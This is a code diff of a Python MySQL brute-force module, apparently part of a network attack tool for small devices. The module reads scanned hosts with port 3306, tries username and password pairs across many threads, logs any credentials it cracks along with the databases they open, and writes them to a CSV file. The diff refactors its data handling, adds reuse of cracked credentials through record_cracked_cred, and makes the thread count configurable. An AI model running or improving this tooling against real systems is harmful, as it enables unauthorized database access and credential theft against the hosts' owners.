@@ -1,5 +1,4 @@
 import os
-import pandas as pd
 import pymysql
 import threading
 import logging
@@ -7,7 +6,7 @@ import time
 from rich.console import Console
 from rich.progress import Progress, BarColumn, TextColumn, SpinnerColumn
 from queue import Queue
-from shared import SharedData
+from shared import SharedData, netkb_targets, append_csv_rows, dedupe_csv, credential_candidates, record_cracked_cred
 from logger import Logger
 
 # Configure the logger
@@ -66,10 +65,7 @@ class SQLConnector:
         """
         Load the scan file and filter it for SQL ports.
         """
-        self.scan = pd.read_csv(self.shared_data.netkbfile)
-        if "Ports" not in self.scan.columns:
-            self.scan["Ports"] = None
-        self.scan = self.scan[self.scan["Ports"].str.contains("3306", na=False)]
+        self.scan = netkb_targets(self.shared_data.netkbfile, "3306")
 
     def sql_connect(self, adresse_ip, user, password):
         """
@@ -118,7 +114,8 @@ class SQLConnector:
                     # Ajouter une entrée pour chaque base de données trouvée
                     for db in databases:
                         self.results.append([adresse_ip, user, password, port, db])
-                    
+                    record_cracked_cred(self.shared_data, user, password)
+
                     logger.success(f"Found credentials for IP: {adresse_ip} | User: {user} | Password: {password}")
                     logger.success(f"Databases found: {', '.join(databases)}")
                     self.save_results()
@@ -131,14 +128,14 @@ class SQLConnector:
     def run_bruteforce(self, adresse_ip, port):
         self.load_scan_file()
 
-        total_tasks = len(self.users) * len(self.passwords)
-        
-        for user in self.users:
-            for password in self.passwords:
-                if self.shared_data.orchestrator_should_exit:
-                    logger.info("Orchestrator exit signal received, stopping bruteforce task addition.")
-                    return False, []
-                self.queue.put((adresse_ip, user, password, port))
+        candidates = credential_candidates(self.shared_data, self.users, self.passwords)
+        total_tasks = len(candidates)
+
+        for user, password in candidates:
+            if self.shared_data.orchestrator_should_exit:
+                logger.info("Orchestrator exit signal received, stopping bruteforce task addition.")
+                return False, []
+            self.queue.put((adresse_ip, user, password, port))
 
         success_flag = [False]
         threads = []
@@ -146,7 +143,7 @@ class SQLConnector:
         with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%")) as progress:
             task_id = progress.add_task("[cyan]Bruteforcing SQL...", total=total_tasks)
 
-            for _ in range(40):  # Adjust the number of threads based on the RPi Zero's capabilities
+            for _ in range(self.shared_data.bruteforce_threads):  # config-driven, core-aware (shared_data.bruteforce_threads)
                 t = threading.Thread(target=self.worker, args=(progress, task_id, success_flag))
                 t.start()
                 threads.append(t)
@@ -171,8 +168,7 @@ class SQLConnector:
         """
         Save the results of successful connection attempts to a CSV file.
         """
-        df = pd.DataFrame(self.results, columns=['IP Address', 'User', 'Password', 'Port', 'Database'])
-        df.to_csv(self.sqlfile, index=False, mode='a', header=not os.path.exists(self.sqlfile))
+        append_csv_rows(self.sqlfile, self.results)
         logger.info(f"Saved results to {self.sqlfile}")
         self.results = []
 
@@ -180,9 +176,7 @@ class SQLConnector:
         """
         Remove duplicate entries from the results CSV file.
         """
-        df = pd.read_csv(self.sqlfile)
-        df.drop_duplicates(inplace=True)
-        df.to_csv(self.sqlfile, index=False)
+        dedupe_csv(self.sqlfile)
 
 if __name__ == "__main__":
     shared_data = SharedData()
